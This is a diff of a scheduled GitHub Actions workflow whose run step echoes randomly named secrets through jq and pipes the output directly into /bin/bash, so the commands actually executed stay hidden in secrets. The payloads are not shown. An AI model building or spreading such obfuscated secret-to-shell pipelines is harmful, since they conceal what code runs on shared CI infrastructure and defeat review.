@@ -2,7 +2,8 @@ name: kumaozhongqin
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 3/6 * * *'
+    - cron: '0 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,15 +11,12 @@ jobs:
       - uses: actions/checkout@v4
       - name: kumaozhongqin
         env:
-          vtlj70: ${{ secrets.vtlj70 }}
+          jbccz220: ${{ secrets.jbccz220 }}
         run: |
-          echo $vtlj70 | jq -r .dlx92 | /bin/bash
-          echo $wvxz21 | jq -r .rqp6 | /bin/bash
-          echo $abirn3 | jq -r .p91 | /bin/bash
-          echo $qrqx152 | jq -r .sfhf5604 | /bin/bash
-          echo $vreg27286 | jq -r .cbty66 | /bin/bash
-          echo $s31804 | jq -r .f75238 | /bin/bash
-          echo $ku4489 | jq -r .fy9705 | /bin/bash
-          echo $fkxig58872 | jq -r .sux0511 | /bin/bash
-          echo $k7 | jq -r .yonmm9837 | /bin/bash
+          echo $jbccz220 | jq -r .o28122 | /bin/bash
+          echo $vwx5 | jq -r .eedhy31 | /bin/bash
+          echo $f56046 | jq -r .q5 | /bin/bash
+          echo $f76749 | jq -r .pqdkf19808 | /bin/bash
+          echo $wxt49972 | jq -r .c41 | /bin/bash
+          echo $xrs2899 | jq -r .xzbl27 | /bin/bash
 
